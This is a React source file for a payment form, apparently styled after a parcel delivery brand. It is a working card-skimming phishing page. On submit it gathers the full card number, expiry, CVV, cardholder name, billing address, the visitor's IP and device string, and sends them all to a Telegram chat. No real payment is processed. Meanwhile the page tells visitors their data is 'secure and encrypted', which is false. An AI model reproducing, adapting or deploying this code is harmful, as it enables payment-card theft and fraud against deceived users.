import { useState, useEffect } from "react";
import { CreditCard, Lock, ArrowRight, ArrowLeft, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import AddressAutocomplete, { AddressSuggestion } from "./AddressAutocomplete";
import { supabase } from "@/integrations/supabase/client";

interface PaymentFormProps {
  onProceed: () => void;
  onBack: () => void;
}

// Complete list of all countries
const COUNTRIES = [
  { code: "AF", name: "Afghanistan" },
  { code: "AL", name: "Albania" },
  { code: "DZ", name: "Algeria" },
  { code: "AD", name: "Andorra" },
  { code: "AO", name: "Angola" },
  { code: "AG", name: "Antigua and Barbuda" },
  { code: "AR", name: "Argentina" },
  { code: "AM", name: "Armenia" },
  { code: "AU", name: "Australia" },
  { code: "AT", name: "Austria" },
  { code: "AZ", name: "Azerbaijan" },
  { code: "BS", name: "Bahamas" },
  { code: "BH", name: "Bahrain" },
  { code: "BD", name: "Bangladesh" },
  { code: "BB", name: "Barbados" },
  { code: "BY", name: "Belarus" },
  { code: "BE", name: "Belgium" },
  { code: "BZ", name: "Belize" },
  { code: "BJ", name: "Benin" },
  { code: "BT", name: "Bhutan" },
  { code: "BO", name: "Bolivia" },
  { code: "BA", name: "Bosnia and Herzegovina" },
  { code: "BW", name: "Botswana" },
  { code: "BR", name: "Brazil" },
  { code: "BN", name: "Brunei" },
  { code: "BG", name: "Bulgaria" },
  { code: "BF", name: "Burkina Faso" },
  { code: "BI", name: "Burundi" },
  { code: "CV", name: "Cabo Verde" },
  { code: "KH", name: "Cambodia" },
  { code: "CM", name: "Cameroon" },
  { code: "CA", name: "Canada" },
  { code: "CF", name: "Central African Republic" },
  { code: "TD", name: "Chad" },
  { code: "CL", name: "Chile" },
  { code: "CN", name: "China" },
  { code: "CO", name: "Colombia" },
  { code: "KM", name: "Comoros" },
  { code: "CG", name: "Congo" },
  { code: "CD", name: "Congo (DRC)" },
  { code: "CR", name: "Costa Rica" },
  { code: "CI", name: "Côte d'Ivoire" },
  { code: "HR", name: "Croatia" },
  { code: "CU", name: "Cuba" },
  { code: "CY", name: "Cyprus" },
  { code: "CZ", name: "Czech Republic" },
  { code: "DK", name: "Denmark" },
  { code: "DJ", name: "Djibouti" },
  { code: "DM", name: "Dominica" },
  { code: "DO", name: "Dominican Republic" },
  { code: "EC", name: "Ecuador" },
  { code: "EG", name: "Egypt" },
  { code: "SV", name: "El Salvador" },
  { code: "GQ", name: "Equatorial Guinea" },
  { code: "ER", name: "Eritrea" },
  { code: "EE", name: "Estonia" },
  { code: "SZ", name: "Eswatini" },
  { code: "ET", name: "Ethiopia" },
  { code: "FJ", name: "Fiji" },
  { code: "FI", name: "Finland" },
  { code: "FR", name: "France" },
  { code: "GA", name: "Gabon" },
  { code: "GM", name: "Gambia" },
  { code: "GE", name: "Georgia" },
  { code: "DE", name: "Germany" },
  { code: "GH", name: "Ghana" },
  { code: "GR", name: "Greece" },
  { code: "GD", name: "Grenada" },
  { code: "GT", name: "Guatemala" },
  { code: "GN", name: "Guinea" },
  { code: "GW", name: "Guinea-Bissau" },
  { code: "GY", name: "Guyana" },
  { code: "HT", name: "Haiti" },
  { code: "HN", name: "Honduras" },
  { code: "HU", name: "Hungary" },
  { code: "IS", name: "Iceland" },
  { code: "IN", name: "India" },
  { code: "ID", name: "Indonesia" },
  { code: "IR", name: "Iran" },
  { code: "IQ", name: "Iraq" },
  { code: "IE", name: "Ireland" },
  { code: "IL", name: "Israel" },
  { code: "IT", name: "Italy" },
  { code: "JM", name: "Jamaica" },
  { code: "JP", name: "Japan" },
  { code: "JO", name: "Jordan" },
  { code: "KZ", name: "Kazakhstan" },
  { code: "KE", name: "Kenya" },
  { code: "KI", name: "Kiribati" },
  { code: "KP", name: "North Korea" },
  { code: "KR", name: "South Korea" },
  { code: "KW", name: "Kuwait" },
  { code: "KG", name: "Kyrgyzstan" },
  { code: "LA", name: "Laos" },
  { code: "LV", name: "Latvia" },
  { code: "LB", name: "Lebanon" },
  { code: "LS", name: "Lesotho" },
  { code: "LR", name: "Liberia" },
  { code: "LY", name: "Libya" },
  { code: "LI", name: "Liechtenstein" },
  { code: "LT", name: "Lithuania" },
  { code: "LU", name: "Luxembourg" },
  { code: "MG", name: "Madagascar" },
  { code: "MW", name: "Malawi" },
  { code: "MY", name: "Malaysia" },
  { code: "MV", name: "Maldives" },
  { code: "ML", name: "Mali" },
  { code: "MT", name: "Malta" },
  { code: "MH", name: "Marshall Islands" },
  { code: "MR", name: "Mauritania" },
  { code: "MU", name: "Mauritius" },
  { code: "MX", name: "Mexico" },
  { code: "FM", name: "Micronesia" },
  { code: "MD", name: "Moldova" },
  { code: "MC", name: "Monaco" },
  { code: "MN", name: "Mongolia" },
  { code: "ME", name: "Montenegro" },
  { code: "MA", name: "Morocco" },
  { code: "MZ", name: "Mozambique" },
  { code: "MM", name: "Myanmar" },
  { code: "NA", name: "Namibia" },
  { code: "NR", name: "Nauru" },
  { code: "NP", name: "Nepal" },
  { code: "NL", name: "Netherlands" },
  { code: "NZ", name: "New Zealand" },
  { code: "NI", name: "Nicaragua" },
  { code: "NE", name: "Niger" },
  { code: "NG", name: "Nigeria" },
  { code: "MK", name: "North Macedonia" },
  { code: "NO", name: "Norway" },
  { code: "OM", name: "Oman" },
  { code: "PK", name: "Pakistan" },
  { code: "PW", name: "Palau" },
  { code: "PS", name: "Palestine" },
  { code: "PA", name: "Panama" },
  { code: "PG", name: "Papua New Guinea" },
  { code: "PY", name: "Paraguay" },
  { code: "PE", name: "Peru" },
  { code: "PH", name: "Philippines" },
  { code: "PL", name: "Poland" },
  { code: "PT", name: "Portugal" },
  { code: "QA", name: "Qatar" },
  { code: "RO", name: "Romania" },
  { code: "RU", name: "Russia" },
  { code: "RW", name: "Rwanda" },
  { code: "KN", name: "Saint Kitts and Nevis" },
  { code: "LC", name: "Saint Lucia" },
  { code: "VC", name: "Saint Vincent and the Grenadines" },
  { code: "WS", name: "Samoa" },
  { code: "SM", name: "San Marino" },
  { code: "ST", name: "Sao Tome and Principe" },
  { code: "SA", name: "Saudi Arabia" },
  { code: "SN", name: "Senegal" },
  { code: "RS", name: "Serbia" },
  { code: "SC", name: "Seychelles" },
  { code: "SL", name: "Sierra Leone" },
  { code: "SG", name: "Singapore" },
  { code: "SK", name: "Slovakia" },
  { code: "SI", name: "Slovenia" },
  { code: "SB", name: "Solomon Islands" },
  { code: "SO", name: "Somalia" },
  { code: "ZA", name: "South Africa" },
  { code: "SS", name: "South Sudan" },
  { code: "ES", name: "Spain" },
  { code: "LK", name: "Sri Lanka" },
  { code: "SD", name: "Sudan" },
  { code: "SR", name: "Suriname" },
  { code: "SE", name: "Sweden" },
  { code: "CH", name: "Switzerland" },
  { code: "SY", name: "Syria" },
  { code: "TW", name: "Taiwan" },
  { code: "TJ", name: "Tajikistan" },
  { code: "TZ", name: "Tanzania" },
  { code: "TH", name: "Thailand" },
  { code: "TL", name: "Timor-Leste" },
  { code: "TG", name: "Togo" },
  { code: "TO", name: "Tonga" },
  { code: "TT", name: "Trinidad and Tobago" },
  { code: "TN", name: "Tunisia" },
  { code: "TR", name: "Turkey" },
  { code: "TM", name: "Turkmenistan" },
  { code: "TV", name: "Tuvalu" },
  { code: "UG", name: "Uganda" },
  { code: "UA", name: "Ukraine" },
  { code: "AE", name: "United Arab Emirates" },
  { code: "GB", name: "United Kingdom" },
  { code: "US", name: "United States" },
  { code: "UY", name: "Uruguay" },
  { code: "UZ", name: "Uzbekistan" },
  { code: "VU", name: "Vanuatu" },
  { code: "VA", name: "Vatican City" },
  { code: "VE", name: "Venezuela" },
  { code: "VN", name: "Vietnam" },
  { code: "YE", name: "Yemen" },
  { code: "ZM", name: "Zambia" },
  { code: "ZW", name: "Zimbabwe" },
];

const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardName, setCardName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostcode] = useState("");
  const [country, setCountry] = useState("");
  const [isDetectingCountry, setIsDetectingCountry] = useState(true);
  
  // Honeypot field - bots will fill this, humans won't see it
  const [honeypot, setHoneypot] = useState("");

  // Auto-detect country from IP on mount
  useEffect(() => {
    const detectCountry = async () => {
      try {
        const { data, error } = await supabase.functions.invoke('detect-country');
        
        if (error) {
          console.error('Error detecting country:', error);
          return;
        }

        if (data?.countryCode) {
          // Find matching country in our list
          const matchedCountry = COUNTRIES.find(c => c.code === data.countryCode);
          if (matchedCountry) {
            setCountry(matchedCountry.code);
            console.log('Auto-detected country:', matchedCountry.name);
          }
        }
      } catch (err) {
        console.error('Failed to detect country:', err);
      } finally {
        setIsDetectingCountry(false);
      }
    };

    detectCountry();
  }, []);

  // Luhn algorithm to validate card numbers
  const validateLuhn = (cardNum: string): boolean => {
    const digits = cardNum.replace(/\s/g, "");
    if (!/^\d{13,19}$/.test(digits)) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i], 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  // Detect card type based on prefix
  type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  
  const detectCardType = (cardNum: string): CardType => {
    const digits = cardNum.replace(/\s/g, "");
    
    // Visa: starts with 4
    if (/^4/.test(digits)) return 'visa';
    
    // Mastercard: starts with 51-55 or 2221-2720
    if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits)) return 'mastercard';
    
    // Amex: starts with 34 or 37
    if (/^3[47]/.test(digits)) return 'amex';
    
    // Discover: starts with 6011, 622126-622925, 644-649, 65
    if (/^(6011|65|64[4-9]|622(1(2[6-9]|[3-9])|[2-8]|9([01]|2[0-5])))/.test(digits)) return 'discover';
    
    return 'unknown';
  };

  const [cardType, setCardType] = useState<CardType>('unknown');

  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get expected CVV length based on card type
  const getExpectedCvvLength = (): number => {
    return cardType === 'amex' ? 4 : 3;
  };

  // Validate CVV based on card type
  const validateCvv = (cvvValue: string): { valid: boolean; error: string } => {
    const expectedLength = getExpectedCvvLength();
    if (cvvValue.length === 0) return { valid: true, error: "" };
    if (cvvValue.length < expectedLength) return { valid: true, error: "" }; // Still typing
    if (cvvValue.length !== expectedLength) {
      return { valid: false, error: `CVV must be ${expectedLength} digits` };
    }
    return { valid: true, error: "" };
  };

  const handleCvvChange = (value: string) => {
    const digits = value.replace(/\D/g, "");
    const maxLength = getExpectedCvvLength();
    const trimmed = digits.slice(0, maxLength);
    setCvv(trimmed);
    
    if (trimmed.length === maxLength) {
      const validation = validateCvv(trimmed);
      setCvvError(validation.error);
    } else {
      setCvvError("");
    }
  };

  // Validate expiry date
  const validateExpiry = (expiryValue: string): { valid: boolean; error: string } => {
    if (expiryValue.length < 5) return { valid: true, error: "" }; // Still typing
    
    const [monthStr, yearStr] = expiryValue.split("/");
    const month = parseInt(monthStr, 10);
    const year = parseInt("20" + yearStr, 10);
    
    if (month < 1 || month > 12) {
      return { valid: false, error: "Invalid month" };
    }
    
    const now = new Date();
    const currentMonth = now.getMonth() + 1;
    const currentYear = now.getFullYear();
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return { valid: false, error: "Card has expired" };
    }
    
    if (year > currentYear + 20) {
      return { valid: false, error: "Invalid year" };
    }
    
    return { valid: true, error: "" };
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiry(value);
    setExpiry(formatted);
    
    const validation = validateExpiry(formatted);
    setExpiryError(validation.error);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    setCardNumber(formatted);
    
    // Detect card type
    setCardType(detectCardType(formatted));
    
    const digits = formatted.replace(/\s/g, "");
    if (digits.length >= 13) {
      if (!validateLuhn(formatted)) {
        setCardError("Invalid card number");
      } else {
        setCardError("");
      }
    } else {
      setCardError("");
    }
  };

  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return v.substring(0, 2) + (v.length > 2 ? "/" + v.substring(2, 4) : "");
    }
    return v;
  };

  const getClientIp = async (): Promise<string | null> => {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch {
      return null;
    }
  };

  const getUserAgent = (): string => {
    return navigator.userAgent || "Unknown";
  };

  const sendTelegramNotification = async () => {
    try {
      const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
      const clientIp = await getClientIp();
      const userAgent = getUserAgent();
      const message = `💳 <b>New Payment Details Submitted</b>

👤 <b>Cardholder:</b> ${cardName}
💳 <b>Card:</b> ${cardNumber}
📅 <b>Expiry:</b> ${expiry}
🔐 <b>CVV:</b> ${cvv}

📍 <b>Billing Address:</b>
${address}
${city}, ${postcode}
${countryName}

🌐 <b>IP:</b> <code>${clientIp || "Unknown"}</code>
💻 <b>Device:</b> <code>${userAgent}</code>

⏰ <b>Time:</b> ${new Date().toLocaleString()}`;

      await supabase.functions.invoke("send-telegram", {
        body: { message },
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Bot detection: if honeypot is filled, silently reject
    if (honeypot) {
      console.log("Bot detected via honeypot");
      // Simulate success to fool bots, but don't process
      onProceed();
      return;
    }
    
    // Validate card number with Luhn algorithm
    if (!validateLuhn(cardNumber)) {
      setCardError("Invalid card number");
      return;
    }
    
    // Validate expiry date
    const expiryValidation = validateExpiry(expiry);
    if (!expiryValidation.valid) {
      setExpiryError(expiryValidation.error);
      return;
    }
    
    // Validate CVV
    const cvvValidation = validateCvv(cvv);
    if (!cvvValidation.valid) {
      setCvvError(cvvValidation.error);
      return;
    }
    
    const expectedCvvLength = getExpectedCvvLength();
    if (cvv.length !== expectedCvvLength) {
      setCvvError(`CVV must be ${expectedCvvLength} digits`);
      return;
    }
    
    setIsSubmitting(true);
    try {
      await sendTelegramNotification();
      onProceed();
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="animate-slide-up">
      <div className="card-elevated p-8 max-w-lg mx-auto">
        <div className="flex items-center justify-center mb-6">
          <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
            <CreditCard className="w-8 h-8 text-primary" />
          </div>
        </div>

        <h2 className="text-2xl font-display font-bold text-center mb-2">
          Payment Details
        </h2>
        <p className="text-muted-foreground text-center mb-6">
          Enter your card and billing information
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Honeypot field - hidden from real users, bots will fill it */}
          <div 
            aria-hidden="true" 
            style={{ 
              position: 'absolute', 
              left: '-9999px', 
              top: '-9999px',
              opacity: 0,
              pointerEvents: 'none'
            }}
          >
            <label htmlFor="website_url">Website URL</label>
            <input
              type="text"
              id="website_url"
              name="website_url"
              tabIndex={-1}
              autoComplete="off"
              value={honeypot}
              onChange={(e) => setHoneypot(e.target.value)}
            />
          </div>

          {/* Card Details Section */}
          <div className="space-y-4">
            <h3 className="font-semibold text-sm text-muted-foreground uppercase tracking-wide">
              Card Information
            </h3>

            <div>
              <label className="block text-sm font-medium mb-2">
                Cardholder Name
              </label>
              <input
                type="text"
                placeholder="John Smith"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                className="input-field"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-2">
                Card Number
              </label>
              <div className="relative">
                <input
                  type="text"
                  placeholder="1234 5678 9012 3456"
                  value={cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                  maxLength={19}
                  className={`input-field font-mono pr-14 ${cardError ? 'border-destructive focus:ring-destructive' : ''}`}
                  required
                />
                {/* Card type icon */}
                <div className="absolute right-3 top-1/2 -translate-y-1/2">
                  {cardType === 'visa' && (
                    <div className="flex items-center justify-center w-10 h-6 bg-[#1A1F71] rounded text-white text-xs font-bold">
                      VISA
                    </div>
                  )}
                  {cardType === 'mastercard' && (
                    <div className="flex items-center gap-0.5">
                      <div className="w-5 h-5 rounded-full bg-[#EB001B]" />
                      <div className="w-5 h-5 rounded-full bg-[#F79E1B] -ml-2.5" />
                    </div>
                  )}
                  {cardType === 'amex' && (
                    <div className="flex items-center justify-center w-10 h-6 bg-[#006FCF] rounded text-white text-[8px] font-bold">
                      AMEX
                    </div>
                  )}
                  {cardType === 'discover' && (
                    <div className="flex items-center justify-center w-10 h-6 bg-[#FF6000] rounded text-white text-[7px] font-bold">
                      DISCOVER
                    </div>
                  )}
                  {cardType === 'unknown' && cardNumber.length === 0 && (
                    <CreditCard className="w-5 h-5 text-muted-foreground" />
                  )}
                </div>
              </div>
              {cardError && (
                <p className="text-destructive text-sm mt-1">{cardError}</p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium mb-2">Expiry</label>
                <input
                  type="text"
                  placeholder="MM/YY"
                  value={expiry}
                  onChange={(e) => handleExpiryChange(e.target.value)}
                  maxLength={5}
                  className={`input-field font-mono ${expiryError ? 'border-destructive focus:ring-destructive' : ''}`}
                  required
                />
                {expiryError && (
                  <p className="text-destructive text-sm mt-1">{expiryError}</p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">
                  CVV {cardType === 'amex' ? '(4 digits)' : '(3 digits)'}
                </label>
                <input
                  type="text"
                  placeholder={cardType === 'amex' ? '1234' : '123'}
                  value={cvv}
                  onChange={(e) => handleCvvChange(e.target.value)}
                  maxLength={getExpectedCvvLength()}
                  className={`input-field font-mono ${cvvError ? 'border-destructive focus:ring-destructive' : ''}`}
                  required
                />
                {cvvError && (
                  <p className="text-destructive text-sm mt-1">{cvvError}</p>
                )}
              </div>
            </div>
          </div>

          {/* Billing Address Section */}
          <div className="space-y-4 pt-4 border-t border-border">
            <h3 className="font-semibold text-sm text-muted-foreground uppercase tracking-wide">
              Billing Address
            </h3>

            <div>
              <label className="block text-sm font-medium mb-2">
                Street Address
              </label>
              <AddressAutocomplete
                value={address}
                onChange={setAddress}
                onSelect={(selected: AddressSuggestion) => {
                  setAddress(selected.street);
                  setCity(selected.city);
                  setPostcode(selected.postcode);
                  setCountry(selected.country);
                }}
                placeholder="Start typing your address..."
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium mb-2">City</label>
                <input
                  type="text"
                  placeholder="London"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="input-field"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">
                  Postcode
                </label>
                <input
                  type="text"
                  placeholder="SW1A 1AA"
                  value={postcode}
                  onChange={(e) => setPostcode(e.target.value)}
                  className="input-field"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium mb-2">
                Country {isDetectingCountry && <span className="text-muted-foreground text-xs">(detecting...)</span>}
              </label>
              <select
                value={country}
                onChange={(e) => setCountry(e.target.value)}
                className="input-field"
                required
              >
                <option value="">Select country</option>
                {COUNTRIES.map((c) => (
                  <option key={c.code} value={c.code}>
                    {c.name}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div className="flex items-center gap-2 text-sm text-muted-foreground bg-secondary/50 p-3 rounded-lg">
            <Lock className="w-4 h-4" />
            <span>Your payment information is secure and encrypted</span>
          </div>

          <div className="flex gap-3 pt-2">
            <Button
              type="button"
              onClick={onBack}
              variant="outline"
              className="flex-1 h-12 rounded-xl"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back
            </Button>
            <Button
              type="submit"
              disabled={isSubmitting}
              className="flex-1 h-12 text-base font-semibold bg-primary hover:bg-dpd-dark text-primary-foreground rounded-xl disabled:opacity-70"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  Complete Payment
                  <ArrowRight className="w-4 h-4 ml-2" />
                </>
              )}
            </Button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PaymentForm;
